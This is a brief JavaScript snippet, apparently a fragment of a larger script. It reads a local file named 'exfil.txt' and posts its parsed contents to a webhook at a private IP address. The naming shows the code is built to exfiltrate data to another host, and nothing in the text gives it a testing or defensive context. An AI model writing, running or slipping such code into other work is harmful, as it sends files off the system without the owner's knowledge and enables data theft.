const webhookURL = 'http://10.0.15.1/';
const exfilPath = path.join(__dirname, 'exfil.txt');
const data = JSON.parse(fs.readFileSync(exfilPath, 'utf8'));
axios.post(webhookURL, { data });
